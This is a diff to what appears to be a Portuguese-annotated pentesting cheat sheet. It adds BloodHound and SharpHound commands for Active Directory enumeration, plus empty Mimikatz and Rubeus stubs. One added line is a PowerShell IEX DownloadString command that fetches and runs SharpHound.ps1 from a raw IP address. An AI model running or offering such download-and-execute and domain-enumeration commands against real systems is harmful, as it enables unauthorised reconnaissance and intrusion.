@@ -183,7 +183,27 @@ python setup.py install
 bloodhound-python -u username -p password -dc xx.aa.com --disable-auto-gc -d aa.com         --CHECAR OPÇÔES DEFAULT , INTERESSANTE LIMITAR AOS DOMAIN CONTROLELRS
 bloodhound-python -u username -p password -dc xx.aa.com --disable-auto-gc -d aa.com -c all   --TODOS O S METODOS DE COLLECTION
 ```
-
+##### BLOODHOUND - POWERSHELL
+```
+IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/SharpHound.ps1")
+Invoke-BloodHound 
+```
+```
+Invoke-BloodHound -CollectionMethod ACL,ObjectProps
+-CompressData -RemoveCSV and -NoSaveCache   --GERAR O ARQUIVO ZIP PARA ARRASRTAR NO BLOODHOUND
+```
+##### BLOODHOUND - SHARPHOUND
+```
+SharpHound.exe
+```
+##### MIMIKATZ
+```
+aaa
+```
+##### RUBEUS
+```
+aaa
+```
 # POWERSHELL
 ## DOWNLOAD
 ##### POWERSHELL - DOWNLOAD AS STRING
